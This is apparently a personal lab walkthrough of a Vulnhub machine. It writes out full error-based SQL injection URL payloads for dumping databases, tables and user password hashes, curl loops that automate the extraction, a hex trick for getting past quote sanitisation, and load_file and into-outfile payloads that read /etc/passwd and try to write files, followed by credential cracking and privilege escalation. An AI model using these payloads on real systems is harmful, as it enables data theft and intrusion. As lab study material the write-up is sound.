Vulnhub
[[SSH attack]]
`$sshpass -p 'CIA' ssh nicky@172.16.1.129 'ping -c 1 172.16.1.129'` *Run commands y using a SSH session (it's important to get fingerprint before)*

`$tcpdump -i ens33 icmp -n` *Listen for connections to interface ens33*

`$gobuster dir -u http://172.16.1.129/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  -t 20 --add-slash` *using 20 threads*

![[Pasted image 20240315210056.png]]

## SQL Injection
[[Error-based SQL-Injection]]

1' order by 100-- - *Injection on URL to guess column numbers*

http://172.16.1.129/vworkshop/sparepartsstoremore.php?sparepartid=-1%27%20union%20select%201,2,3,%22test%22,5,6,7--%20- *we produce an error using -1 to get the values set in union statement*
### BD Enumeration

http://172.16.1.129/vworkshop/sparepartsstoremore.php?sparepartid=-1%27%20union%20select%201,2,3,schema_name,5,6,7%20from%20information_schema.schemata%20limit%201,1--%20- *We get BD names by setting different limits*
#### by group contact
http://172.16.1.129/vworkshop/sparepartsstoremore.php?sparepartid=-1%27%20union%20select%201,2,3,group_concat(schema_name),5,6,7%20from%20information_schema.schemata--%20-
#### Automation
 `for i in $(seq 0 10); do echo "[+] BD $i: $(curl -s -X GET "http://172.16.1.129/vworkshop/sparepartsstoremore.php?sparepartid=-1%27%20union%20select%201,2,3,schema_name,5,6,7%20from%20information_schema.schemata%20limit%20$i,1--%20-" | grep "Cost :"| html2text | awk 'NF{print $NF}')"; done`
> [+] BD 1: BlackMarket
[+] BD 2: eworkshop
[+] BD 3: mysql
[+] BD 4: performance_schema
### Tables Enumeration

Of all the DBs, not only the first one
http://172.16.1.129/vworkshop/sparepartsstoremore.php?sparepartid=-1%27%20union%20select%201,2,3,table_name,5,6,7%20from%20information_schema.tables%20limit%200,1--%20-
*payload using union select to get the first table name which is in 4th column*. Limit 0 1 to get the fist one, 1 1, the second one and so on

`curl -s -X GET 'http://172.16.1.129/vworkshop/sparepartsstoremore.php?sparepartid=-1%27%20union%20select%201,2,3,table_name,5,6,7%20from%20information_schema.tables%20limit%200,1--%20-' | grep "Cost :" | html2text | awk 'NF{print $NF}'` *get the first table*
>CHARACTER_SETS


#### Automation
`for i in $(seq 1 100); do echo "[+] Pour le valuer $i: $(curl -s -X GET "http://172.16.1.129/vworkshop/sparepartsstoremore.php?sparepartid=-1%27%20union%20select%201,2,3,table_name,5,6,7%20from%20information_schema.tables%20limit%20$i,1--%20-" | grep "Cost :" | html2text | awk 'NF{print $NF}')"; done` *iterator to enumerate tables*
>[+] Pour le valuer 1: COLLATIONS
[+] Pour le valuer 2: COLLATION_CHARACTER_SET_APPLICABILITY
[+] Pour le valuer 3: COLUMNS
[+] Pour le valuer 4: COLUMN_PRIVILEGES

http://172.16.1.129/vworkshop/sparepartsstoremore.php?sparepartid=-1%27%20union%20select%201,2,3,group_concat(table_name),5,6,7%20from%20information_schema.tables%20where%20table_schema=%27BlackMArket%27--%20---%20-

#### Specifying each DB

http://172.16.1.129/vworkshop/sparepartsstoremore.php?sparepartid=-1%27%20union%20select%201,2,3,group_concat(table_name),5,6,7%20from%20information_schema.tables%20where%20table_schema=%27BlackMarket%27--%20-
![[Pasted image 20240316081509.png]]
### Columns Enumeration
#### For *flag* table:
http://172.16.1.129/vworkshop/sparepartsstoremore.php?sparepartid=-1%27%20union%20select%201,2,3,group_concat(column_name),5,6,7%20from%20information_schema.columns%20where%20table_schema=%27BlackMarket%27%20and%20table_name=%27flag%27--%20-

![[Pasted image 20240316081719.png]]
If string *flag* is not permitted to be used, we can always change it by his hexadecimal value:

`echo -n "flag" | xxd`
>00000000: 666c 6167                                flag

We add 0x666c6167 without using *'* we get same result **useful to bypass special character sanitization**:
http://172.16.1.129/vworkshop/sparepartsstoremore.php?sparepartid=-1%27%20union%20select%201,2,3,group_concat(column_name),5,6,7%20from%20information_schema.columns%20where%20table_schema=%27BlackMarket%27%20and%20table_name=0x666c6167--%20-

![[Pasted image 20240316090404.png]]
#### For *user* table:
http://172.16.1.129/vworkshop/sparepartsstoremore.php?sparepartid=-1%27%20union%20select%201,2,3,group_concat(column_name),5,6,7%20from%20information_schema.columns%20where%20table_schema=%27BlackMarket%27%20and%20table_name=%27user%27--%20-

### Column's information dump
#### For flag table:
http://172.16.1.129/vworkshop/sparepartsstoremore.php?sparepartid=-1%27%20union%20select%201,2,3,group_concat(name,%22:%22,%20information),5,6,7%20from%20BlackMarket.flag--%20-}

By using a URL decoder:
`http://172.16.1.129/vworkshop/sparepartsstoremore.php?sparepartid=-1' union select 1,2,3,group_concat(name,":", information),5,6,7 from BlackMarket.flag-- -`

![[Pasted image 20240316085745.png]]
#### For user table
http://172.16.1.129/vworkshop/sparepartsstoremore.php?sparepartid=-1%27%20union%20select%201,2,3,group_concat(username,0x3a,password),5,6,7%20from%20BlackMarket.user--%20- *we use 0x3a as a hex value for ":"*
>admin:==cf18233438b9e88937ea0176f1311885==,user:0d8d5cd06832b29560745fe4e1b941cf,supplier:99b0e8da24e29e4ccb5d7d76e677c2ac,jbourne:28267a2e06e312aee91324e2fe8ef1fd,bladen :cbb8d2a0335c793532f9ad516987a41c

![[Pasted image 20240316090718.png]]
### Eploitong DB load_file function

*REF:* https://www.w3resource.com/mysql/string-functions/mysql-load_file-function.php

payload:
http://172.16.1.129/vworkshop/sparepartsstoremore.php?sparepartid=-1%27%20union%20select%201,2,load_file(%22/etc/passwd%22),group_concat(column_name),5,6,7%20from%20information_schema.columns%20where%20table_schema=%27BlackMarket%27%20and%20table_name=0x666c6167--%20- *server's username enumeration*

![[Pasted image 20240316082635.png]]

We can verify if we found a key file in */home/dimitri/.ssh/* 
### Test to upload files by SQL Injection

We need to have write permissions on server

payload:
http://172.16.1.129/vworkshop/sparepartsstoremore.php?sparepartid=-1%27%20union%20select%201,2,%22test%22,4,5,6,7%20into%20outfile%20%22/var/www/html/test.txt%22--%20-

We look for test.txt if we supposed /var/www/html is the root directory of the site:

http://172.16.1.129/test.txt **it doesn't work for this machine because we don't have write privileges**

# Cracking Hash password

#### Editing the hashes
[[Linux terminal commands]]

### nvim

The hashes are stored in a file called *hashes* and we use vim or nvim to edit them:

To replace "," with \r for all "g"
:%s/,/\r/g

From:
admin:==cf18233438b9e88937ea0176f1311885==,user:0d8d5cd06832b29560745fe4e1b941cf,supplier:99b0e8da24e29e4ccb5d7d76e677c2ac,jbourne:28267a2e06e312aee91324e2fe8ef1fd,bladen :cbb8d2a0335c793532f9ad516987a41c

To:

admin: cf18233438b9e88937ea0176f1311885
user: 0d8d5cd06832b29560745fe4e1b941cf
supplier: 99b0e8da24e29e4ccb5d7d76e677c2ac
jbourne: 28267a2e06e312aee91324e2fe8ef1fd
bladen : cbb8d2a0335c793532f9ad516987a41c

#### *Note:* We can use commands to copy only the hashes:

`cat hashes | awk '{print $2}' FS=":" | xclip -sel clip`


![[Pasted image 20240316101258.png]]

User: **Admin** Pass: **BigBossCIA**

## Accessing Login portals 

http://172.16.1.129/login.php

![[Pasted image 20240316101905.png]]

Possible password: **?????**

![[Pasted image 20240316103751.png]]

User to test **jbourne**

### In Squirrelmail

![[Pasted image 20240316103909.png]]

We found a message in INBOX.Trash

![[Pasted image 20240316103943.png]]

Using a site to decode hide messages:

https://www.quipqiup.com/
#CipherSolver
![[Pasted image 20240316104247.png]]
http://172.16.1.129/vworkshop/kgbbackdoor/PassPass.jpg

![[Pasted image 20240316104358.png]]
### Stenography analysis
[[Stenography]]
#Stenography
Downloading the file to inspect 
`wget http://172.16.1.129/vworkshop/kgbbackdoor/PassPass.jpg`

by using steghide or strings
`$strings PassPass.jpg`
>Pass = 5215565757312090656

We try that decimal *pass* convert to hexadecimal first and then to text

![[Pasted image 20240316110050.png]]


### Directory numeration for kbgbackdoor

`$gobuster dir -u http://172.16.1.129/vworkshop/kgbbackdoor/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  -t 20 --add-slash -t 20 -x php` *looking for php file in the directory*

![[Pasted image 20240316104727.png]]
![[Pasted image 20240316104908.png]]
*It seems not visible but if we inspect the source code:*
![[Pasted image 20240316104944.png]]

We found a hide box to put a password

We try credential *HailKGB* in input box, password found in the hidden message of PassPass.jpg
![[Pasted image 20240316110208.png]]

### Shell generation
![[Pasted image 20240316115736.png]]

![[Interactive Shell]]
### Looking for files
![[Pasted image 20240316125739.png]]

![[Pasted image 20240316125857.png]]

User: Dimitri
Password **DimitriHateApple**
![[Pasted image 20240316131126.png]]

## Privilege Scalation
As user is in sudo group, we only need to execute *sudo su*

## Pivoting

#Lateral_Movement
Wre verify that there is two interfaces, we can scan eth01 to see new hosts:
![[Pasted image 20240316132030.png]]
We can implement pivoting to get a new machine
[[IMF]]

